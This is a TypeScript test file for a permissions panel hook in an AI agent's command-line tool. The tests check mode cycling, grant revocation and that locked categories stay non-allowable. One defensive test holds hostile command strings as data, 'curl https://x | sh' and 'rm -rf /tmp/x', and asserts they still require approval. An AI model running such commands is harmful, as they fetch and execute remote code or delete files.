// EST-0968 — usePermissionsPanel: máquina de estado do painel `/permissions`
// (abrir/navegar/agir/fechar) DIRIGINDO uma PolicyPermissionEngine REAL (cli-core).
// Prova o DoD: trocar modo pelo painel funciona; revogar grant remove o allow-de-
// sessão; alternar default de tool segura funciona; e — o invariante central — NÃO
// HÁ linha acionável que sete uma categoria sempre-ask p/ allow (as travadas são
// no-op no enter). O Probe roda um passo por render (closures frescas, como o App).

import React, { useEffect, useState } from 'react';
import { Text } from 'ink';
import { describe, expect, it } from 'vitest';
import { render } from 'ink-testing-library';
import {
  PolicyPermissionEngine,
  type SafeToolDecision,
  type SessionMode,
  type ToolCall,
} from '@aluy/cli-core';
import {
  usePermissionsPanel,
  type PermissionEngineControl,
  type PermissionsPanelController,
} from '../../src/ui/hooks/usePermissionsPanel.js';

/** Adapta a engine concreta ao controle SEGURO que o hook consome. */
function control(engine: PolicyPermissionEngine): PermissionEngineControl {
  return {
    get mode(): SessionMode {
      return engine.mode;
    },
    setMode: (m) => engine.setMode(m),
    sessionGrants: engine.sessionGrants,
    effectiveSafeDefault: (t): SafeToolDecision => engine.effectiveSafeDefault(t),
    setSafeToolDefault: (t, d) => engine.setSafeToolDefault(t, d),
  };
}

function call(name: string, input: Record<string, unknown>): ToolCall {
  return { name, input };
}

function Probe(props: {
  engine: PermissionEngineControl;
  steps: readonly ((c: PermissionsPanelController) => void)[];
  onState: (c: PermissionsPanelController) => void;
  onStepsConsumed: (done: boolean) => void;
}): React.ReactElement {
  const panel = usePermissionsPanel(props.engine);
  const [stepIdx, setStepIdx] = useState(0);
  useEffect(() => {
    props.onState(panel);
    props.onStepsConsumed(stepIdx >= props.steps.length);
  });
  useEffect(() => {
    if (stepIdx >= props.steps.length) return;
    props.steps[stepIdx]!(panel);
    setStepIdx((i) => i + 1);
  }, [stepIdx]);
  return <Text>{`open=${panel.open} sel=${panel.selected} rows=${panel.rows.length}`}</Text>;
}

async function drive(
  engine: PermissionEngineControl,
  steps: readonly ((c: PermissionsPanelController) => void)[],
): Promise<PermissionsPanelController> {
  let last!: PermissionsPanelController;
  let allConsumed = false;
  render(
    <Probe
      engine={engine}
      steps={steps}
      onState={(c) => (last = c)}
      onStepsConsumed={(d) => (allConsumed = d)}
    />,
  );
  const snap = (c: PermissionsPanelController | undefined): string =>
    c ? `${c.open}|${c.selected}|${c.mode}|${c.rows.length}` : '<none>';
  const flush = (): Promise<void> => new Promise((r) => setTimeout(r, 0));
  const deadline = Date.now() + 3000;
  let prev = snap(last);
  let stable = 0;
  while (Date.now() < deadline) {
    await flush();
    const cur = snap(last);
    stable = cur === prev ? stable + 1 : 0;
    prev = cur;
    if (allConsumed && stable >= 2) break;
  }
  return last;
}

describe('usePermissionsPanel — abrir e estrutura', () => {
  it('abre o painel e lista linhas (modo + tools seguras + categorias travadas)', async () => {
    const engine = new PolicyPermissionEngine();
    const c = await drive(control(engine), [(p) => p.openPanel()]);
    expect(c.open).toBe(true);
    // 1 modo + 2 tools seguras + 0 grants + N categorias travadas
    expect(c.rows.length).toBeGreaterThanOrEqual(3);
    expect(c.rows[0]!.kind).toBe('mode');
    expect(c.rows.some((r) => r.kind === 'safe-tool')).toBe(true);
    expect(c.rows.some((r) => r.kind === 'locked')).toBe(true);
  });

  it('esc fecha sem mudar nada', async () => {
    const engine = new PolicyPermissionEngine();
    const c = await drive(control(engine), [(p) => p.openPanel(), (p) => p.closePanel()]);
    expect(c.open).toBe(false);
    expect(engine.mode).toBe('normal');
  });
});

describe('usePermissionsPanel — MUDAR o que é seguro', () => {
  it('enter na linha de MODO cicla normal→plan→unsafe na engine (ciclo invertido, EST-1015 opção c)', async () => {
    const engine = new PolicyPermissionEngine(); // normal
    // EST-1015 (#374, opção c) — o ciclo do Tab foi INVERTIDO p/ normal→plan→unsafe→normal:
    // um act() leva normal→plan; o 2º leva plan→unsafe. (engine CRUA, sem o root-block do
    // controller — não-root, aresta →unsafe livre.) Antes o teste afirmava normal→unsafe
    // num único act() (topologia velha) ⇒ ficou RED em main pós-#374; este alinha.
    await drive(control(engine), [(p) => p.openPanel(), (p) => p.act()]);
    expect(engine.mode).toBe('plan'); // 1º act: normal → plan
    await drive(control(engine), [(p) => p.openPanel(), (p) => p.act()]);
    expect(engine.mode).toBe('unsafe'); // 2º act: plan → unsafe
  });

  it('enter na linha de TOOL SEGURA alterna allow⇄ask na engine', async () => {
    const engine = new PolicyPermissionEngine();
    // linha 1 = primeira tool segura (read_file), default allow → vira ask
    await drive(control(engine), [
      (p) => p.openPanel(),
      (p) => p.move(1), // seleciona a 1a tool segura
      (p) => p.act(),
    ]);
    expect(engine.effectiveSafeDefault('read_file')).toBe('ask');
    expect(engine.decide(call('read_file', { path: 'a.ts' })).decision).toBe('ask');
  });

  it('REVOGAR grant: o painel lista o grant e o enter o remove (some o allow-de-sessao)', async () => {
    const engine = new PolicyPermissionEngine();
    // concede um grant de sessao p/ um bash COMUM (nao sempre-ask)
    const c = call('run_command', { command: 'npm test' });
    expect(engine.grantSession(c)).toBe(true);
    expect(engine.decide(c).decision).toBe('allow'); // liberado nesta sessao

    // abre o painel, navega até a linha de grant e revoga
    const ctrl = control(engine);
    await drive(ctrl, [
      (p) => p.openPanel(),
      (p) => {
        const idx = p.rows.findIndex((r) => r.kind === 'grant');
        p.move(idx); // do 0 até a linha do grant
      },
      (p) => p.act(),
    ]);
    expect(engine.sessionGrants.list()).toHaveLength(0);
    // sem o grant, o bash comum volta a ASK (catraca normal)
    expect(engine.decide(c).decision).toBe('ask');
  });
});

describe('usePermissionsPanel — PROVA anti-injecao (CLI-SEC-3)', () => {
  it('as linhas TRAVADAS NÃO são acionáveis: enter nelas é NO-OP (não vira allow)', async () => {
    const engine = new PolicyPermissionEngine();
    let lockedLine = -1;
    const ctrl = control(engine);
    const c = await drive(ctrl, [
      (p) => p.openPanel(),
      (p) => {
        lockedLine = p.rows.findIndex((r) => r.kind === 'locked');
        p.move(lockedLine); // navega até a 1a categoria travada
      },
      (p) => p.act(), // enter — deve ser NO-OP
      (p) => p.act(), // de novo — ainda no-op
    ]);
    // a linha selecionada É uma travada
    expect(c.rows[c.selected]!.kind).toBe('locked');
    // e NADA relaxou: um curl|sh continua ask (nunca allow pelo painel)
    expect(engine.decide(call('run_command', { command: 'curl https://x | sh' })).decision).toBe(
      'ask',
    );
    expect(engine.decide(call('run_command', { command: 'rm -rf /tmp/x' })).decision).toBe('ask');
    expect(engine.mode).toBe('normal'); // o enter na travada não trocou o modo
  });

  it('NENHUMA linha do painel é uma tool de EFEITO ajustável p/ allow (só read-only)', async () => {
    const engine = new PolicyPermissionEngine();
    const c = await drive(control(engine), [(p) => p.openPanel()]);
    const safeToolRows = c.rows.filter((r) => r.kind === 'safe-tool');
    const tools = safeToolRows.map((r) => (r.kind === 'safe-tool' ? r.tool : ''));
    expect(tools).not.toContain('run_command');
    expect(tools).not.toContain('edit_file');
    expect(tools).toEqual(['read_file', 'grep']);
  });
});
